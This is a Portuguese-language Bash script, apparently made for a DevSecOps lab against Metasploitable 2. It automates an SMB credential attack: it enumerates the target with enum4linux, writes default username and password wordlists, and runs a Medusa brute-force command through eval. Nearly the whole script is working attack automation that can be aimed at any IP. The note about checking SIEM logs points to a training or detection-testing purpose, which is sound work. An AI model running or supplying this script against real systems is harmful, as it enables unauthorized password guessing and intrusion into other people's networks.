#!/bin/bash

# --- Configurações ---
USERS_FILE="smb-users.txt"
PASS_FILE="smb-pass-spray.txt"
ENUM_OUTPUT="enum4-output.txt"
DEFAULT_USERS=("user" "msfadmin" "service" "guest")
DEFAULT_PASSWORDS=("password" "123456" "Welcome123" "msfadmin" "toor")

# --- Funções de Criação de Listas ---

criar_lista_usuarios() {
    echo "--- 🧑‍💻 Geração da Lista de Usuários ---"
    printf "%s\n" "${DEFAULT_USERS[@]}" > $USERS_FILE
    
    read -p "Deseja adicionar um usuário personalizado? (s/n): " resposta
    if [[ "$resposta" == "s" || "$resposta" == "S" ]]; then
        echo "Digite os usuários (um por linha). Pressione ENTER duas vezes para finalizar."
        while IFS= read -r user; do
            [[ -z "$user" ]] && break
            echo "$user" >> $USERS_FILE
        done
    fi
    echo "[SUCESSO] Lista de usuários salva em $USERS_FILE com $(wc -l < $USERS_FILE) itens."
}

criar_lista_senhas() {
    echo "--- 🔑 Geração da Lista de Senhas ---"
    printf "%s\n" "${DEFAULT_PASSWORDS[@]}" > $PASS_FILE

    read -p "Deseja adicionar uma senha personalizada? (s/n): " resposta
    if [[ "$resposta" == "s" || "$resposta" == "S" ]]; then
        echo "Digite as senhas (um por linha). Pressione ENTER duas vezes para finalizar."
        while IFS= read -r pass; do
            [[ -z "$pass" ]] && break
            echo "$pass" >> $PASS_FILE
        done
    fi
    echo "[SUCESSO] Lista de senhas salva em $PASS_FILE com $(wc -l < $PASS_FILE) itens."
}

# --- Fluxo Principal ---
main() {
    echo "--- 💻 DevSecOps Lab: Força Bruta SMB (Bash) ---"
    
    # ETAPA 0: Solicita o IP
    read -p "➡️ Digite o IP do Alvo SMB (Metasploitable 2 - ex: 192.168.15.36): " TARGET_IP

    if [[ -z "$TARGET_IP" ]]; then
        echo "[ERRO] IP do alvo não fornecido. Abortando."
        return 1
    fi
    
    # ETAPA 1: Enumeração com enum4linux
    echo "\n--- 1. Enumeração com Enum4Linux ---"
    if ! command -v enum4linux &> /dev/null
    then
        echo "[ERRO] 'enum4linux' não encontrado. Abortando."
        return 1
    fi
    echo "🚀 Executando enum4linux -a $TARGET_IP. Output salvo em $ENUM_OUTPUT..."
    enum4linux -a "$TARGET_IP" | tee "$ENUM_OUTPUT"

    # ETAPA 2: Criação de Listas (Incluindo Interação)
    echo "\n--- 2. Criação e Personalização das Wordlists ---"
    criar_lista_usuarios
    criar_lista_senhas

    # ETAPA 3: Ataque com Medusa
    echo "\n--- 3. Ataque de Força Bruta com Medusa (SMB) ---"
    if ! command -v medusa &> /dev/null
    then
        echo "[ERRO] 'medusa' não encontrado. Abortando."
        return 1
    fi
    
    MEDUSA_COMMAND="medusa -h $TARGET_IP -U $USERS_FILE -P $PASS_FILE -M smbnt -t 2 -T 50"
    
    echo "Comando: $MEDUSA_COMMAND"
    echo "🚀 Executando Força Bruta contra $TARGET_IP..."
    
    # Executa o comando Medusa
    eval $MEDUSA_COMMAND
    
    echo "✅ FIM da execução do Medusa. Verifique os logs do sistema e do SIEM para detecção."

    # Limpeza
    echo "\n--- Limpeza de Arquivos Temporários ---"
    rm -f $USERS_FILE $PASS_FILE
    echo "[CONCLUÍDO] Arquivos $USERS_FILE e $PASS_FILE removidos. Mantenha $ENUM_OUTPUT para análise."
}

# Inicia o script
main